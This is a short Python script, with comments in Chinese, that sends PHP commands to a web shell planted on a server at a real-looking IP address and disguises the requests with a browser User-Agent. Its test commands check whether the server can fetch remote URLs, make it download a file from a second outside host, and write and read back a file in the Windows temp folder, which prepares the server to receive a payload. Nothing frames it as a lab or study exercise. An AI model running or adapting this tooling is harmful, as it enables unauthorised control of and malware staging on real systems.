#!/usr/bin/env python3
"""诊断 v3: 用单引号避免嵌套问题"""
import urllib.request, urllib.parse

SHELL = "http://81.70.245.25/yy.php"
def cmd(c):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=40)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:80]}"

tests = [
    ("配置", "print_r(ini_get('allow_url_fopen'));"),
    ("小文件", "print_r(file_get_contents('http://165.99.43.145:9124/mark.txt'));"),
    ("本地写", "print_r(var_export(file_put_contents('C:/Windows/Temp/m2.txt','OK2'),true));"),
    ("读回", "print_r(file_get_contents('C:/Windows/Temp/m2.txt'));"),
]
for name, code in tests:
    r = cmd(code)
    print(f"--- {name} ---")
    print("  out:", repr(r.strip()[-120:]))
